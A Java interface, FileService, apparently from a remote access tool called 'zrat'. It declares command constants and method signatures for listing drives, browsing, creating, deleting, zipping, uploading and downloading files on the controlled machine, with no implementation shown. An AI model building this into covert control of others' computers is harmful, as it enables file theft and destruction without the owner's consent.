package com.zrat.server.controller;

import java.io.RandomAccessFile;

import com.zrat.transfer.model.TransferDataStruct;

public interface FileService {
	public static final String COMMAND_SHOWROOTS = "showRoots";
	public static final String COMMAND_SHOWFILES = "showFiles";
	public static final String COMMAND_CREATEFILE = "createFile";
	public static final String COMMAND_CREATEDIRECTORY = "createDirectory";
	public static final String COMMAND_DELETEFILE = "deleteFile";
	public static final String COMMAND_DOWNLOAD = "downloadFile";
	public static final String COMMAND_DOWNLOAD_BYTE = "fileByte";
	public static final String COMMAND_ZIPFILE = "zipFile";
	public static final String COMMAND_UNZIPFILE = "unzipFile";
	public static final String COMMAND_CUTFILE = "cutFile";
	public static final String COMMAND_COPYFILE = "copyFile";
	public static final String COMMAND_UPLOADFILE = "uploadFile";
	
	public TransferDataStruct copyFile(String fileName, String targetPath);
	public TransferDataStruct cutFile(String fileName, String targetPath);
	public TransferDataStruct unZipFile(String unZipPath,String unZipFileName);
	public TransferDataStruct zipFile(String inputFileName,String zipFileName);
	public TransferDataStruct getRoots() ;
	public TransferDataStruct getFiles(String path) ;
	public TransferDataStruct createDic(String path,String fileName);
	public TransferDataStruct createFile(String path,String fileName);
	public RandomAccessFile download(String file,String size);
	public TransferDataStruct deleteFile(String path);
	public void uploadFile(String path,String fileName,byte[] b);
	public void uploadFile(String filePath,byte[] b);

}
